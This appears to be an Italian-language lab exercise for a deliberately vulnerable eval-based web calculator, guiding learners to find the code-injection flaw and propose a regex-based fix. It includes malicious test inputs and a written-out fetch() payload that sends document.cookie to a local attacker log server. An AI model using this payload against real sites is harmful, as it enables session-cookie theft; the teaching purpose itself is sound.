# Obbiettivo
1. Utilizzare la calcolatrice per eseguire operazioni matematiche.
2. Scoprire la vulnerabilità nascosta (uso di eval) che permette l'esecuzione di codice arbitrario.
3. Analizzare come i dati (cookie, token, ecc.) vengono inviati al server di log (http://localhost:3001/attack-logs).
4. Proporre una soluzione per mitigare la vulnerabilità.
   - Suggerimento: utilizzare una regular expression: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions

## Test
### Input Valido
- Verificare prima il funzionamento della calcolatrice:
  - 5 + 10 * 2 --> Risultato: 25
  - Math.sqrt(16) --> Risultato: 4

### Input malevolo
- alert('HACKED!')
- document.cookie

## Simulare un Attacco
- Inserire nel campo input della calcolatrice questo comando:
`fetch('http://localhost:3001/log-attack?data=' + document.cookie).then(response => response.text()).then(data => data)`

- controlla nel web server dell'attaccante i dati sensibili della vittima che vengono memorizzati nel file attacks.log